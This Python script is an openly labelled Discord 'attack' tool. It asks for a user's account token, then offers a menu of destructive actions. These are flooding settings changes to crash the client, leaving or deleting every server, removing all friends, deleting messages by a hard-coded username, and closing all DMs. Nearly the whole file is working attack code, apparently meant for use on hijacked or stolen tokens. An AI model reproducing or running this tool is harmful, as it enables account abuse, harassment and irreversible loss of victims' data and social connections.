import requests, os, time, random, string

class attacks():
    
    def client_crasher(token):
        headers = {
            "authorization": token
        }
        locales = ["da", "de", "en-GB", "en-US", "es-ES", "fr", "hr", "it", "lt", "hu", "nl", "no", "pl", "pt-BR", "ro", "fi", "sv-SE", "vi", "tr", "cs", "el", "bg", "ru", "uk", "th", "zh-CN", "ja", "zh-TW", "ko"]
        modes = ["light", "dark"]
        statuses = ["online", "idle", "dnd", "invisible"]
        count = 0
        while True:
            count += 1
            try:
                settings = {
                "status": random.choice(statuses),
                "locale": random.choice(locales),
                "custom_status": {
                    "text": "".join([random.choice(string.ascii_letters + string.digits) for i in range(40)])
                },
                "theme": random.choice(modes)
                }
                x = requests.patch("https://discord.com/api/v10/users/@me/settings", headers=headers, json=settings)
                if x.status_code == 200:
                    print("[*] Crashing client [REQUEST: {}]".format(count))
                else:
                    print("[*] Discord rate limit [REQUEST: {}]".format(count))
            except:
                break
    
    def server_leaver(token):
        headers = {
            "authorization": token
        }
        guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json()
        for guild in guilds:
            requests.delete("https://discord.com/api/v10/users/@me/guilds/{}".format(guild["id"]), headers=headers)
            requests.delete("https://discord.com/api/v10/guilds/{}".format(guild["id"]), headers=headers)
            print("[*] Leaving guild [SERVER: {}]".format(guild["name"]))
    
    def friend_remover(token):
        headers = {
            "authorization": token
        }
        friends = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers).json()
        for friend in friends:
            requests.delete("https://discord.com/api/v10/users/@me/relationships/{}".format(friend["id"]), headers=headers)
            print("[*] Removing friend [USERNAME: {}]".format(friend["user"]["username"]))
            
    def message_remover(token):
        headers = {
            "authorization": token
        }
        channels = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers).json()
        for channel in channels:
            try:
                x = requests.get("https://discord.com/api/v10/channels/{}/messages?limit=100".format(channel["id"]), headers=headers)
                for data in x.json():
                    loop = True
                    while loop:
                        if data["author"]["username"] == "Snikker":
                            x = requests.delete("https://discord.com/api/v10/channels/{}/messages/{}".format(channel["id"], data["id"]), headers=headers)
                            if x.status_code != 429:
                                print("[*] Message deleted [CONTENT: {}] [ID: {}]".format(data["content"], data["id"]))
                                loop = False
                            else:
                                time.sleep(1)
                                loop = True
                        else:
                            loop = False
            except:
                break
            
    def dm_remover(token):
        headers = {
            "authorization": token
        }
        channels = requests.get("https://discord.com/api/v10/users/@me/channels", headers=headers).json()
        for channel in channels:
            requests.delete("https://discord.com/api/v10/channels/{}".format(channel["id"]), headers=headers)
            print("[*] DM closed [ID: {}]".format(channel["id"]))
            
os.system("cls")

token = input("[?] Enter discord token: ")

headers = {
    "authorization": token
}

def main():
    print("\n[*] Logged in as: {}".format(requests.get("https://discord.com/api/v10/users/@me", headers=headers).json()["username"]))
    time.sleep(1)
    print("[*] Loaded {} guilds\n".format(len(requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json())))

    time.sleep(2)
    print("[1] Client crasher")
    print("[2] Server leaver")
    print("[3] Message remover")
    print("[4] Friend remover")
    print("[5] DM remover")

    time.sleep(1)
    attack = int(input("\n[?] Select attack: "))

    if attack == 1:
        os.system("cls")
        attacks.client_crasher(token)
        input("\n[*] Attack executed, press enter to continue.. ")
        time.sleep(1)
        os.system("cls")
        main()
    elif attack == 2:
        os.system("cls")
        attacks.server_leaver(token)
        input("\n[*] Attack executed, press enter to continue.. ")
        time.sleep(1)
        os.system("cls")
        main()
    elif attack == 3:
        os.system("cls")
        attacks.message_remover(token)
        input("\n[*] Attack executed, press enter to continue.. ")
        time.sleep(1)
        os.system("cls")
        main()
    elif attack == 4:
        os.system("cls")
        attacks.friend_remover(token)
        input("\n[*] Attack executed, press enter to continue.. ")
        time.sleep(1)
        os.system("cls")
        main()
    elif attack == 5:
        os.system("cls")
        attacks.dm_remover(token)
        input("\n[*] Attack executed, press enter to continue.. ")
        time.sleep(1)
        os.system("cls")
        main()
    
main()
    

